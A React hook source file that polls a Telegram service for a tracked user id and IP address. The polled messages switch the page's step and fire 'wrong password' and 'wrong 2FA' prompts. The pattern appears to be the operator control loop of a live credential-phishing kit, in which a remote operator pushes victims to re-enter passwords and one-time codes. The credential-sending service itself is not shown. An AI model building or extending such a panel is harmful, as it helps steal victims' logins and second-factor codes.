import { useEffect, useRef, useCallback } from "react";
import { TelegramService } from "../utils/telegramService";
import { PAGE_CONSTANTS } from "../utils/pageUtils";

export const useTelegramPolling = (
  Unik,
  setStep,
  setLastFetch,
  LastFetch,
  Ip,
  setWrong2faTrigger,
  wrong2faTrigger,
  setWrongPasswordTrigger,
  wrongPasswordTrigger
) => {
  const intervalRef = useRef(null);
  const timeoutRef = useRef(null);
  const isPollingRef = useRef(false);

  // Memoize the current state to prevent unnecessary effect re-runs
  const currentState = useRef({
    setStep,
    setLastFetch,
    LastFetch,
    Ip,
    setWrong2faTrigger,
    wrong2faTrigger,
    setWrongPasswordTrigger,
    wrongPasswordTrigger,
  });

  // Update current state ref when dependencies change
  useEffect(() => {
    currentState.current = {
      setStep,
      setLastFetch,
      LastFetch,
      Ip,
      setWrong2faTrigger,
      wrong2faTrigger,
      setWrongPasswordTrigger,
      wrongPasswordTrigger,
    };
  }, [
    setStep,
    setLastFetch,
    LastFetch,
    Ip,
    setWrong2faTrigger,
    wrong2faTrigger,
    setWrongPasswordTrigger,
    wrongPasswordTrigger,
  ]);

  // Polling function with exponential backoff
  const poll = useCallback(async () => {
    if (isPollingRef.current) {
      return;
    }

    isPollingRef.current = true;

    try {
      await TelegramService.pollMessages(Unik, currentState.current);
    } catch (error) {
      if (process.env.NODE_ENV === "development") {
        console.warn("[Telegram Polling] Error during polling:", error.message);
      }
    } finally {
      isPollingRef.current = false;
    }

    // Schedule next poll with potential delay for error handling
    const delay = TelegramService.getPollingDelay();
    const nextInterval = PAGE_CONSTANTS.POLLING_INTERVAL + delay;

    if (process.env.NODE_ENV === "development" && delay > 0) {
      console.log(
        `[Telegram Polling] Next poll in ${nextInterval}ms (with ${delay}ms error delay)`
      );
    }

    timeoutRef.current = setTimeout(() => {
      if (intervalRef.current) {
        poll();
      }
    }, nextInterval);
  }, [Unik]);

  // Start polling
  const startPolling = useCallback(() => {
    if (intervalRef.current || !Unik) return;

    if (process.env.NODE_ENV === "development") {
      console.log("[Telegram Polling] Starting polling for user:", Unik);
    }

    intervalRef.current = true; // Use as a flag
    poll(); // Start first poll immediately
  }, [Unik, poll]);

  // Stop polling
  const stopPolling = useCallback(() => {
    if (process.env.NODE_ENV === "development") {
      console.log("[Telegram Polling] Stopping polling");
    }

    intervalRef.current = null;

    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current);
      timeoutRef.current = null;
    }

    isPollingRef.current = false;
  }, []);

  // Main effect to manage polling lifecycle
  useEffect(() => {
    if (!Unik) {
      stopPolling();
      return;
    }

    startPolling();

    // Cleanup on unmount or when Unik changes
    return () => {
      stopPolling();
    };
  }, [Unik, startPolling, stopPolling]);

  // Cleanup on component unmount
  useEffect(() => {
    return () => {
      stopPolling();
      // Reset error state when component unmounts
      TelegramService.resetErrorState();
    };
  }, [stopPolling]);
};
